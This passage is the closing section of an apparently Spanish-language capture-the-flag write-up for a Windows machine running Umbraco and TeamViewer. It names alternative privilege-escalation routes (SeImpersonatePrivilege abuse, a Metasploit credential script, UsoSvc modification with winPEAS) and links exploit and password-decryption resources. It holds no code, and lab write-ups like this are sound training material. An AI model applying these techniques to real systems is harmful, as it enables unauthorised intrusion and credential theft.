* Abusar del **SeImpersonatePrivilege** que está activo para ejecutar una Shell que nos conecta como root.
* Usando el script de Metasploit hecho en ruby para obtener las credenciales como lo hice.
* Usar la herramienta **winPEAS** para editar el servicio **UsoSvc** y con este mismo podemos entrar como root.
¡Puedes investigar y probar estas formas! Apóyate de otros Write Ups.

## Links de Investigación
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind
* https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data
* https://hashes.com/es/decrypt/hash 
* https://vk9-sec.com/umbraco-cms-7-12-4-authenticated-remote-code-execution/
* https://github.com/samratashok/nishang
* https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat
* https://whynotsecurity.com/blog/teamviewer/
* https://kalilinuxtutorials.com/decryptteamviewer/
* https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0
* https://bobbyhadz.com/blog/python-no-module-named-crypto

# FIN
